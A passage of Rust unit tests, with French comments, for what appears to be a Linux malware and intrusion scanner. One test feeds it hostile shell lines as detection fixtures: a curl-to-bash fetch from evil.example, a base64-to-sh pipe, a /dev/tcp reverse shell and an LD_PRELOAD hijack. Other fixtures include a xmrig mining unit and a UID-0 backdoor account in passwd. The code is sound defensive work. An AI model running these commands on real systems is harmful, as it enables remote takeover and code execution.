        assert!(assess_process(&view("sshd", Some("/usr/sbin/sshd"), "sshd -D"), HOME).is_empty());
        assert!(assess_process(&view("rust-analyzer", Some("/home/amine/.cargo/bin/rust-analyzer"), "x"), HOME).is_empty());
        assert!(assess_process(&view("mon-outil", Some("/home/amine/projets/outil/target/debug/outil"), "x"), HOME).is_empty());
        assert!(assess_process(&view("steam", Some("/home/amine/.local/share/Steam/ubuntu12_32/steam"), "x"), HOME).is_empty());
    }

    #[test]
    fn temp_dir_and_deleted_executables_are_high() {
        let reasons = assess_process(&view("update", Some("/tmp/.x/update"), "/tmp/.x/update"), HOME);
        assert_eq!(worst(&reasons), Some(Severity::High));
        let mut gone = view("agent", Some("/usr/bin/agent"), "agent");
        gone.exe_deleted = true;
        assert_eq!(worst(&assess_process(&gone, HOME)), Some(Severity::High));
        let fileless = view("x", Some("/memfd:payload"), "x");
        assert_eq!(worst(&assess_process(&fileless, HOME)), Some(Severity::High));
        // Processus d'un autre utilisateur : jugé sur la ligne de commande.
        let other = view("x", None, "/dev/shm/x --run");
        assert_eq!(worst(&assess_process(&other, HOME)), Some(Severity::High));
    }

    #[test]
    fn suspicious_names_and_masquerading() {
        assert_eq!(worst(&assess_process(&view("xmrig", Some("/usr/bin/xmrig"), "xmrig"), HOME)), Some(Severity::High));
        assert_eq!(worst(&assess_process(&view("kworker/0:1", Some("/home/amine/kworker"), "x"), HOME)), Some(Severity::High));
        let fake_sshd = view("sshd", Some("/home/amine/sshd"), "sshd");
        assert!(assess_process(&fake_sshd, HOME).iter().any(|(s, r)| *s == Severity::Medium && r.contains("service système")));
    }

    #[test]
    fn hidden_dirs_are_medium_unless_known() {
        assert!(untrusted_hidden_path("/home/amine/.cache/foo/bin", HOME));
        assert!(untrusted_hidden_path("/home/amine/.x/run", HOME));
        assert!(!untrusted_hidden_path("/home/amine/.cargo/bin/x", HOME));
        assert!(!untrusted_hidden_path("/home/amine/.bashrc", HOME), "un fichier caché n'est pas un dossier caché");
        assert!(!untrusted_hidden_path("/usr/bin/x", HOME));
        let reasons = assess_process(&view("x", Some("/home/amine/.hidden/x"), "x"), HOME);
        assert_eq!(worst(&reasons), Some(Severity::Medium));
        // Données d'application (mises à jour Electron, etc.) : gravité faible seulement.
        let electron = assess_process(&view("claude", Some("/home/amine/.config/Claude/claude-code/2.1/claude"), "x"), HOME);
        assert_eq!(worst(&electron), Some(Severity::Low));
        assert_eq!(hidden_path_severity("/home/amine/.local/share/foo/bin", HOME), Some(Severity::Low));
        assert_eq!(hidden_path_severity("/home/amine/.cache/foo/bin", HOME), Some(Severity::Medium));
        assert_eq!(hidden_path_severity("/home/amine/projets/x", HOME), None);
    }

    #[test]
    fn heavy_cpu_alone_is_only_low() {
        let mut busy = view("rustc", Some("/usr/bin/rustc"), "rustc");
        busy.cpu = 97.0;
        assert_eq!(worst(&assess_process(&busy, HOME)), Some(Severity::Low));
    }

    #[test]
    fn mining_ports_and_flagged_listeners() {
        let connection = |state: &str, local: &str, peer: &str, pid: Option<u32>| Connection {
            proto: "tcp".into(),
            state: state.into(),
            local: local.into(),
            peer: peer.into(),
            process: "x".into(),
            pid,
        };
        let flagged: HashSet<u32> = [7].into_iter().collect();
        let list = vec![
            connection("ESTAB", "10.0.0.2:5000", "1.2.3.4:3333", Some(1)),
            connection("ESTAB", "10.0.0.2:5001", "1.2.3.4:443", Some(2)),
            connection("LISTEN", "0.0.0.0:8080", "0.0.0.0:*", Some(7)),
            connection("LISTEN", "0.0.0.0:22", "0.0.0.0:*", Some(3)),
            connection("ESTAB", "10.0.0.2:5002", "5.6.7.8:443", Some(7)),
        ];
        let found = assess_connections(&list, &flagged);
        assert_eq!(found.len(), 3);
        assert_eq!(found[0].0, Severity::High);
        assert!(found[1].2.contains("écoute"));
        assert_eq!(port_of("[::1]:631"), Some(631));
        assert_eq!(port_of("pas-un-port"), None);
    }

    #[test]
    fn detects_dangerous_script_lines() {
        let rc = "# commentaire curl x | sh\nexport PATH=$PATH:~/bin\ncurl -s http://evil.example/x.sh | bash\necho aGk= | base64 -d | sh\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\nexport LD_PRELOAD=/tmp/x.so\nalias sudo='sudo -S'\n";
        let hits = scan_script_text(rc, ScriptKind::ShellRc);
        let reasons: Vec<&str> = hits.iter().map(|(_, reason, _)| *reason).collect();
        assert_eq!(hits.len(), 5, "{reasons:?}");
        assert!(reasons[0].contains("curl"));
        assert!(reasons[1].contains("base64"));
        assert!(reasons[2].contains("/dev/tcp"));
        assert_eq!(hits[3].0, Severity::Medium);
        assert_eq!(hits[4].0, Severity::Medium);
    }

    #[test]
    fn temp_dir_execution_only_matters_in_startup_files() {
        let cron = "*/5 * * * * root /tmp/.hidden/run.sh\n";
        assert_eq!(scan_script_text(cron, ScriptKind::Cron)[0].0, Severity::High);
        assert!(scan_script_text("cd /tmp\nls /tmp/x\n", ScriptKind::ShellRc).is_empty());
        let desktop = "[Desktop Entry]\nExec=/dev/shm/agent\n";
        assert_eq!(scan_script_text(desktop, ScriptKind::Autostart).len(), 1);
        assert!(scan_script_text("0 3 * * * /usr/bin/backup\n", ScriptKind::Cron).is_empty());
        assert_eq!(scan_script_text("ExecStart=/usr/bin/xmrig -o stratum+tcp://pool:3333\n", ScriptKind::Unit)[0].0, Severity::High);
    }

    #[test]
    fn walks_temp_trees_for_executables_and_setuid() {
        use std::os::unix::fs::PermissionsExt;
        let root = std::env::temp_dir().join(format!("um-scan-{}", std::process::id()));
        std::fs::create_dir_all(root.join("sous/dossier")).unwrap();
        std::fs::create_dir_all(root.join(".mount_app")).unwrap();
        let elf = root.join("sous/payload");
        std::fs::write(&elf, [0x7f, b'E', b'L', b'F', 1, 2]).unwrap();
        std::fs::set_permissions(&elf, std::fs::Permissions::from_mode(0o755)).unwrap();
        let script = root.join("run.sh");
        std::fs::write(&script, "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700)).unwrap();
        let data = root.join("data.txt");
        std::fs::write(&data, "texte").unwrap();
        std::fs::set_permissions(&data, std::fs::Permissions::from_mode(0o755)).unwrap();
        let ignored = root.join(".mount_app/appimage-bin");
        std::fs::write(&ignored, [0x7f, b'E', b'L', b'F']).unwrap();
        std::fs::set_permissions(&ignored, std::fs::Permissions::from_mode(0o755)).unwrap();
        let suid = root.join("sous/dossier/elevate");
        std::fs::write(&suid, "x").unwrap();
        std::fs::set_permissions(&suid, std::fs::Permissions::from_mode(0o4755)).unwrap();
        let link = root.join("lien");
        std::os::unix::fs::symlink(&elf, &link).unwrap();

        let mut hits = Vec::new();
        let mut budget = 1000;
        walk_files(&root, 3, &mut budget, true, &mut hits);
        let names: HashSet<String> = hits.iter().map(|h| h.path.file_name().unwrap().to_string_lossy().to_string()).collect();
        assert_eq!(names, ["payload", "run.sh", "elevate"].iter().map(|s| s.to_string()).collect());
        assert!(hits.iter().find(|h| h.path.ends_with("elevate")).unwrap().suid);
        // Sans contrôle des exécutables : seul le setuid est signalé.
        let mut only_suid = Vec::new();
        let mut budget = 1000;
        walk_files(&root, 3, &mut budget, false, &mut only_suid);
        assert_eq!(only_suid.len(), 1);
        // Budget épuisé : arrêt immédiat.
        let mut none = Vec::new();
        let mut empty = 0;
        walk_files(&root, 3, &mut empty, true, &mut none);
        assert!(none.is_empty());
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn quarantine_moves_and_neutralises_a_file() {
        use std::os::unix::fs::PermissionsExt;
        let base = std::env::temp_dir().join(format!("um-quar-{}", std::process::id()));
        let vault = base.join("coffre");
        std::fs::create_dir_all(&base).unwrap();
        let file = base.join("mal.sh");
        std::fs::write(&file, "#!/bin/sh\necho x\n").unwrap();
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o755)).unwrap();
        let message = quarantine_into(&file, &vault).unwrap();
        assert!(message.contains("quarantaine"));
        assert!(!file.exists(), "l'original est retiré");
        let stored: Vec<_> = std::fs::read_dir(&vault).unwrap().flatten().collect();
        assert_eq!(stored.len(), 2, "copie + note d'origine");
        let copy = stored.iter().find(|e| e.file_name().to_string_lossy().ends_with(".quarantaine")).unwrap();
        assert_eq!(std::fs::metadata(copy.path()).unwrap().permissions().mode() & 0o111, 0, "aucun droit d'exécution");
        let info = stored.iter().find(|e| e.file_name().to_string_lossy().ends_with(".info")).unwrap();
        assert!(std::fs::read_to_string(info.path()).unwrap().contains("mal.sh"));
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn quarantine_refuses_dangerous_targets() {
        let base = std::env::temp_dir().join(format!("um-quar2-{}", std::process::id()));
        std::fs::create_dir_all(&base).unwrap();
        let vault = base.join("coffre");
        assert!(quarantine_into(Path::new("/etc/passwd"), &vault).is_err(), "hors des emplacements autorisés");
        assert!(quarantine_into(Path::new("/tmp/../etc/passwd"), &vault).is_err());
        assert!(quarantine_into(&base, &vault).is_err(), "un dossier n'est pas accepté");
        let target = base.join("cible");
        std::fs::write(&target, "x").unwrap();
        let link = base.join("lien");
        std::os::unix::fs::symlink(&target, &link).unwrap();
        assert!(quarantine_into(&link, &vault).is_err(), "un lien n'est pas suivi");
        assert!(target.exists());
        assert!(quarantine_into(&base.join("absent"), &vault).is_err());
        assert!(quarantine_action(&[]).is_err());
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn process_actions_validate_their_input() {
        assert!(process_action(&["abc".into(), "x".into(), "term".into()]).is_err());
        assert!(process_action(&["1".into(), "init".into(), "term".into()]).is_err());
        assert!(process_action(&["999999".into(), "x".into(), "kill".into()]).is_err());
        assert!(process_action(&[]).is_err());
    }

    #[test]
    fn flags_account_anomalies() {
        let passwd = "root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/root:/bin/sh\nnopass::1001:1001::/home/n:/bin/bash\nok:x:1000:1000::/home/ok:/bin/bash\n";
        let found = assess_passwd(passwd);
        assert_eq!(found.len(), 2);
        assert!(found[0].1.contains("UID 0"));
        assert!(found[1].1.contains("sans mot de passe"));
    }

    #[test]
    fn lists_dual_use_tools() {
        let dpkg = "nmap ii \nhydra rc \nfirefox ii \nsocat ii \n";
        assert_eq!(dual_use_installed(dpkg), vec!["nmap", "socat"]);
    }

    #[test]
    fn dual_use_works_for_any_package_manager() {
        let names: Vec<String> = ["bash", "nmap", "socat", "nmap", "glibc"].iter().map(|s| s.to_string()).collect();
        assert_eq!(dual_use_among(&names), vec!["nmap", "socat"]);
        assert!(dual_use_among(&[]).is_empty());
    }

    #[test]
    fn verdict_follows_the_worst_finding() {
        let finding = |severity| Finding { severity, category: "Processus", subject: String::new(), detail: String::new(), actions: Vec::new() };
        assert_eq!(verdict(&[]).1, Level::Ok);
        assert_eq!(verdict(&[finding(Severity::Info), finding(Severity::Low)]).1, Level::Ok);
        assert_eq!(verdict(&[finding(Severity::Medium)]).1, Level::Warn);
        assert_eq!(verdict(&[finding(Severity::Low), finding(Severity::High)]).1, Level::Bad);
        assert!(Severity::High < Severity::Medium && Severity::Medium < Severity::Low);
    }

    #[test]
    fn scan_runs_on_this_machine() {
        let (findings, coverage) = run_scan();
        assert!(coverage.processes > 0);
        assert!(coverage.seconds >= 1.0, "l'échantillonnage CPU dure au moins 1 s");
        assert!(findings.windows(2).all(|pair| pair[0].severity <= pair[1].severity), "constats triés par gravité");
    }
}
